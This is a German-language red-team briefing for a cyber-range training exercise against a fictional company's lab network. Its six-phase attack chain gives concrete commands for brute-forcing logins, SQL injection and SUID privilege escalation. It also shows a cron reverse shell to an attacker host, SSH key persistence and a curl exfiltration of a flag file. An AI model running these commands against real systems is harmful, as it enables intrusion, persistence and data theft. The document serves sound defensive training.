# Red-Team-Briefing — Cyber-Range Pilot

> **Für:** Red-Team (4 Personen, Lead: Andre)
> **Szenario:** Penetration der IT-Infrastruktur der fiktiven **Beispiel GmbH**
> **Spieltag:** Mo 2026-06-01 oder Di 2026-06-02
> **Lies das vor dem Warm-up.** Zugangsdaten bekommst du separat (Onboarding-DM / Handout) — sie
> stehen aus Sicherheitsgründen nicht in diesem Dokument.

---

## Deine Mission

Ihr seid die Angreifer. Euer Job: euch von außen ins Netz der Beispiel GmbH fressen —
Recon, Einbruch, Rechte ausweiten, festsetzen, seitwärts bewegen, Beute rausschaffen. Sechs Phasen,
A bis F. Erfolgskriterien: die Trophy-Datei `/opt/secret/flag.txt` von `linux-victim` **und** der
Kundendaten-Satz (`FLAG-kundendaten.txt`) aus der Nextcloud.

Aber: Ihr seid nicht zum „möglichst leise gewinnen" da. Ihr seid der **Stimulus** für das
Blue-Team. Je sauberer ihr die Attack-Chain durchspielt, desto mehr hat Blue zu erkennen — und
desto mehr lernen alle. Macht Lärm, aber versteht, *welchen* Lärm ihr macht: jede Phase mappt auf
eine MITRE-ATT&CK-Technique und eine konkrete Wazuh-Detection-Rule.

---

## Rules of Engagement (lies das zweimal)

- ✅ **Erlaubt:** alles im DMZ-Subnet `10.99.10.0/28` — `web-target`, `vault-target`,
  `linux-victim`, `nc-target`. Voller Angriff, alle Tools.
- ❌ **Verboten:** das Blue-Subnet `10.99.20.0/28` (inkl. `wazuh-siem`). Die Firewall blockt euch
  da raus (`RED→BLUE deny`) — gar nicht erst versuchen. Kein Cheat-Path, Spielregel **und** technisch erzwungen.
- ❌ **Verboten:** alles außerhalb des Labs. Keine echten Internet-Ziele.
- ⚠️ **Reverse-Shells dürfen rauscallen** (DMZ→Internet offen) — Absicht für Phase F.
- 🤝 **Fair Play:** Kein Löschen von Wazuh-Logs, kein Abschießen von VMs, kein DoS. Wir üben
  Detection, wir zerstören nicht.

Unsicher, ob etwas erlaubt ist? → frag den GM. Lieber einmal zu viel.

---

## Lab-Map (deine Angriffsfläche)

| Host | IP:Port | Was läuft da | Dein Interesse |
|---|---|---|---|
| `web-target` | `10.99.10.2:8080` (WP), `:3000` (Juice Shop) | WordPress 5.4 + Slider Revolution 4.1, OWASP Juice Shop | Web-Einstieg, SQLi, RCE |
| `vault-target` | `10.99.10.3:8443` | Vaultwarden, schwaches Master-PW | Credential-Beute (SSH-Key!) |
| `linux-victim` | `10.99.10.4:22` (SSH), `:8025` (Mailhog) | Apache, SUID-Binary, Cron-Misconfig | Priv-Esc, Persistence, Trophy |
| `nc-target` | `10.99.10.5:8090` | Nextcloud mit „Kundendaten" | Data-Exfil / DLP-Szenario |

Eure Kali-Workstations liegen im RED-Subnet `10.99.30.0/28`: `kali-andre` (`.2`, Lead) +
`kali-user-1..3` (`.3`–`.5`, je ein Account `player1/2/3`). Alles per Tailscale-DNS erreichbar
(`nmap web-target` statt IP geht).

**Toolset (Kali „top10"):** `nmap`, `gobuster`, `sqlmap`, `hydra`, `metasploit`, `searchsploit`,
`burpsuite`, `john`, `hashcat`. tmux ist eingerichtet — teilt eine Session, wenn ihr zu zweit an
einem Host arbeitet.

---

## Die Attack-Chain (6 Phasen)

> Roter Faden — Befehle sind Startpunkte, improvisiert ruhig. Zeiten sind Orientierung.
> Volle Detail-Doku inkl. Detection-Mapping: `docs/attack-chain.md`.

### Phase A — Recon (~20 min) · MITRE T1595, T1046

```bash
nmap -sV -p- 10.99.10.2 10.99.10.3 10.99.10.4 10.99.10.5
gobuster dir -u http://10.99.10.2:8080 -w /usr/share/wordlists/dirb/common.txt
whatweb http://10.99.10.2:8080 && curl -s http://10.99.10.2:3000 | head -20
wpscan --url http://10.99.10.2:8080 --enumerate u,vp
```
**Ergebnis:** WordPress + Juice Shop (`web-target`), Vaultwarden (`vault-target`), Apache+SSH
(`linux-victim`), Nextcloud (`nc-target`). Versionen notieren.
> 🔵 **Blue sieht:** Scan-Spikes (Baseline-Abweichung). Recon *soll* sichtbar sein.

### Phase B — Initial Access (~60 min, mehrere Pfade) · MITRE T1110.001, T1190

```bash
# B1 — WordPress-Login-Brute (→ Rule 100020 HTTP-Brute)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.10.2 -s 8080 \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username or password"

# B2 — Juice-Shop SQL-Injection (→ Rule 100030 SQLi)
sqlmap -u "http://10.99.10.2:3000/rest/products/search?q=test" --random-agent --batch --dbs

# B3 — Vaultwarden-Master-PW (Top-1000) → Trophy-Secret "ssh-key-linux-victim"
hydra ... 10.99.10.3 -s 8443 https-post-form "..."

# B4 — Nextcloud-Admin schwaches PW (→ Rule 100090 NC-Brute-Force)
hydra -l admin -P rockyou-top1000.txt 10.99.10.5 -s 8090 http-post-form "..."
```
**Ergebnis:** Mindestens ein Pfad gibt Zugang. **B3 ist strategisch** — das Vaultwarden-Secret
enthält den SSH-Private-Key für `linux-victim` (Phase E). **B4** öffnet die Nextcloud mit den
„Kundendaten".
> 🔵 **Blue sieht:** 401-Spikes (Rules 100020/100090), NC-Exploit (100091), SQLi-Patterns (100030).

### Phase C — Privilege Escalation (~30 min) · MITRE T1068, T1548.001

```bash
# C1: Slider-Revolution-Exploit (web-target)
searchsploit slider revolution
# C2: SUID-Binary (linux-victim, sobald Shell)
find / -perm -4000 -type f 2>/dev/null      # → /usr/bin/find ist SUID
/usr/bin/find . -exec /bin/sh -p \; -quit   # GTFOBins
```
> 🔵 **Blue sieht:** SUID-Execution (Rule 100050). CySA+-Lernziel L3.

### Phase D — Persistence (~20 min) · MITRE T1053.003, T1098.004

```bash
echo '* * * * * root bash -i >& /dev/tcp/10.99.30.2/4444 0>&1' >> /etc/cron.d/backup-check
echo "<euer-public-key>" >> /root/.ssh/authorized_keys
```
> 🔵 **Blue sieht:** FIM-Alerts — Cron (Rule 100060), SSH-Key-Persistence (100061). Macht's trotzdem, sauber.

### Phase E — Lateral Movement (~30 min) · MITRE T1078, T1021.004

```bash
chmod 600 ssh-key-linux-victim
ssh -i ssh-key-linux-victim victim@10.99.10.4
# Alternativ: Honeypot-Cred aus Nextcloud (intern/passwoerter.xlsx) → SSH linux-victim
```
> 🔵 **Blue sieht (vielleicht):** SSH von neuer Source (Rule 100070). T1078 wird oft NICHT
> erkannt — genau die Lücke, die der Debrief aufzeigt.

### Phase F — Exfiltration (~20 min) · MITRE T1041, T1048.003

```bash
# Linux-Trophy:
cat /opt/secret/flag.txt
curl -X POST -d @/opt/secret/flag.txt http://10.99.30.2:8000/loot

# Nextcloud-Kundendaten via WebDAV rausziehen (→ Rule 100090 Mass-Download):
#   Kundendaten/ inkl. intern/FLAG-kundendaten.txt herunterladen
# Pfad F2 — DNS-Tunneling (subtiler): dnscat2 / iodine
```
**Ergebnis:** beide Trophies bei euch → Red-Sieg. Ob Blue's Detection mithielt, zeigt der Debrief.
> 🔵 **Blue sieht:** NC-Massen-Exfiltration (100092), DNS-Anomalie (100080).

---

## Hermes-GM — euer KI-Spielleiter

Im Telegram-Channel **`cyber-range-red`** sitzt Hermes. Er kennt die Attack-Chain und gibt
**gestufte Hints** (Level 1 = Richtung ohne Befehl, Level 2 = konkreter Befehl) — nie direkt der
ganze Spoiler, **nichts** ans Blue-Team. Max. 6 Hints/Stunde pro Spieler; bei >120 min Stillstand
meldet er sich von selbst.

- *„Wie umgeh ich das WordPress-Login-Rate-Limit?"*
- *„sqlmap findet nichts — was mach ich falsch?"*
- *„Was war nochmal die Pyramid of Pain?"* (CySA+-Theorie ist okay)

---

## Mindset

- **Verstehe, was du tust.** Frag dich bei jedem Schritt: *Welche Spur hinterlasse ich? Welche
  Rule müsste feuern?*
- **Dokumentiere für den Debrief** (Tool, Befehl, Output) — Hermes baut daraus die MITRE-Heatmap.
- **Kein Wettbewerb gegen Blue.** Zwei Seiten derselben Medaille. Am Ende soll jede:r beide
  Perspektiven verstanden haben.

Viel Spaß. Brich nichts außerhalb des DMZ-Subnets. 🚩
